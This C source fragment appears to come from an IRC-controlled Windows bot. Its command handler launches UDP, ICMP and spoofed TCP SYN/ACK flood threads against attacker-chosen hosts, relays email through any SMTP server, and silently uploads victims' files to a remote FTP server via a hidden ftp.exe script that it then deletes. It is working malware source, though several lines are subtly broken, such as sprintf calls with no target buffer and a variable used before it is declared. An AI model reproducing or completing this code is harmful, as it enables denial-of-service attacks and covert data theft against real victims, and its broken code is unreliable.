			sprintf(sendbuf, "[UDP]: Sending %d packets to: %s. Packet size: %d, Delay: %d(ms).", udps.num, udps.host, udps.size, udps.delay);
			udps.threadnum = addthread(sendbuf,UDP_THREAD,NULL);
			if (threads[udps.threadnum].tHandle = CreateThread(NULL, 0, &udp, (LPVOID)&udps, 0, &id)) {
				while(udps.gotinfo == false)
					Sleep(50);
			} else
				sprintf(sendbuf,"[UDP]: Failed to start flood thread, error: <%d>.", GetLastError());

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_PING
		else if (strcmp("pingflood", a[s]) == 0 || strcmp("ping", a[s]) == 0 || strcmp("p", a[s]) == 0) {
			if (!noicmp) {
				PINGFLOOD pings;
				pings.silent = silent;
				pings.notice = notice;
				strncpy(pings.host, a[s+1], sizeof(pings.host)-1);
				pings.num = atoi(a[s+2]);
				pings.size = atoi(a[s+3]);
				pings.delay = atoi(a[s+4]);
				strncpy(pings.chan,  a[2], sizeof(pings.chan)-1);
				pings.sock = sock;

				sprintf(sendbuf, "[PING]: Sending %d pings to %s. packet size: %d, timeout: %d(ms).", pings.num, pings.host, pings.size, pings.delay);
				pings.threadnum = addthread(sendbuf,PING_THREAD,NULL);
				if (threads[pings.threadnum].tHandle = CreateThread(NULL, 0, &ping, (LPVOID)&pings, 0, &id)) {
					while(pings.gotinfo == false)
						Sleep(50);
				} else
					sprintf(sendbuf,"[PING]: Failed to start flood thread, error: <%d>.", GetLastError());
			} else 
				strncpy(sendbuf, "ICMP.dll not available", sizeof(sendbuf)-1);

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		#ifndef NO_TCP
		else if (strcmp("tcpflood", a[s]) == 0 || strcmp("tcp", a[s]) == 0) {
			if (strcmp("syn",a[s+1]) == 0 || strcmp("ack",a[s+1]) == 0 || strcmp("random",a[s+1]) == 0) {
				if ((tcpflood.time = atoi(a[s+4])) > 0) {
					TCPFLOOD tcpflood;
					strncpy(tcpflood.type,a[s+1],sizeof(tcpflood.type));
					strncpy(tcpflood.ip,a[s+2],sizeof(tcpflood.ip));
					tcpflood.port = atoi(a[s+3]);
					tcpflood.spoof = ((parameters['r'])?(true):(false));
					tcpflood.sock = sock;
					strncpy(tcpflood.chan,a[2],sizeof(tcpflood.chan));
					tcpflood.notice = notice;
					tcpflood.silent = silent;

					_snprintf(sendbuf,sizeof(sendbuf),"[TCP]: %s %s flooding: (%s:%s) for %s seconds.", ((tcpflood.spoof)?("Spoofed"):("Normal")), a[s+1], a[s+2], a[s+3], a[s+4]);
					tcpflood.threadnum = addthread(sendbuf,TCP_THREAD,NULL);
					if (threads[tcpflood.threadnum].tHandle = CreateThread(NULL, 0, &TcpFloodThread, (LPVOID)&tcpflood, 0, &id)) {
						while(tcpflood.gotinfo == false)
							Sleep(50);
					} else
						sprintf(sendbuf,"[TCP]: Failed to start flood thread, error: <%d>.", GetLastError());
				} else
					sprintf(sendbuf,"[TCP]: Invalid flood time must be greater than 0.");
			} else
				sprintf(sendbuf,"[TCP]: Invalid flood type specified.");

			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return 1;
		}
		#endif
		else if (strcmp("email", a[s]) == 0 ) {
			/*WORD version = MAKEWORD(1,1);
			WSADATA wsaData;*/
			char server[256], sender_email[256], recp_email[256], subject[256], myBuf[256], BigBuf[1024];
			int port, nRet;

			strcpy(server,a[s+1]);
			port = atoi(a[s+2]);
			strcpy(sender_email,a[s+3]);
			strcpy(recp_email,a[s+4]);
			strcpy(subject,replacestr(a[s+5],"_"," "));
			//fWSAStartup(version, &wsaData);

			SOCKET MailSocket = fsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			SOCKADDR_IN saServer;
			saServer.sin_family = AF_INET;
			saServer.sin_addr.s_addr = ResolveAddress(server);
			saServer.sin_port = fhtons((unsigned short)port);
			sprintf(BigBuf,"helo $rndnick\nmail from: <%s>\nrcpt to: <%s>\ndata\nsubject: %s\nfrom: %s\n%s\n.\n",sender_email,recp_email,subject,sender_email,subject);
			nRet = fconnect(MailSocket, (LPSOCKADDR)&saServer, sizeof(saServer));
			nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
			nRet = fsend(MailSocket, BigBuf, strlen(myBuf), 0);
			nRet = frecv(MailSocket, myBuf, sizeof(myBuf), 0);
			fclosesocket(MailSocket);
			//fWSACleanup();

			sprintf(sendbuf, "[EMAIL]: Message sent to %s.",recp_email);
			if (!silent) irc_privmsg(sock, a[2], sendbuf, notice);
			addlog(sendbuf);

			return repeat;
		}
		#ifndef NO_HTTP
		else if (strcmp("httpcon",a[s]) == 0 || strcmp("hcon",a[s]) == 0) { 
			HTTP_Connect(sock,a[2],notice,silent,a[s+1],atoi(a[s+2]),a[s+3],a[s+4],a[s+5]);

			return repeat;
		}
		#endif
		// commands requiring at least 5 parameters 
		else if (a[s+5] == NULL) return 1; 
		else if (strcmp("upload",a[s]) == 0) {
			if (!FileExists(a[s+5])) { 
				sprintf(sendbuf,"[FTP]: File not found: %s.", a[s+5]);
				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice);
				addlog(sendbuf);
				return 1; 
			} 
			char tmpftp[MAX_PATH],tmpsys[MAX_PATH]; 

			srand(GetTickCount());
			sprintf(tmpftp,"%s\\%c%c%c.dll",tmpsys,randnum(26)+97,randnum(26)+97,randnum(26)+97); 

			FILE * fp = fopen(tmpftp,"ab"); 
			if (fp != NULL) { 
				fprintf(fp, "open %s\r\n%s\r\n%s\r\n%s\r\nput %s\r\nbye\r\n",
					a[s+1],a[s+2],a[s+3],a[s+4],a[s+5]); 
				fclose(fp); 

				char cmdline[256]; 
				sprintf(cmdline,"-s:%s",tmpftp); 
				if (fShellExecute(0, "open", "ftp.exe", cmdline, NULL, SW_HIDE))
					sprintf("[FTP]: Uploading file: %s to: %s",a[s+5],a[s+1]);
				else
					sprintf("[FTP]: Uploading file: %s to: %s failed.",a[s+5],a[s+1]);

				if (!silent) irc_privmsg(sock,a[2],sendbuf,notice); 
				addlog(sendbuf);

				while (FileExists(tmpftp)) 
					remove(tmpftp); 
			}
			return 1;
		}
	}

	return 1;
}
		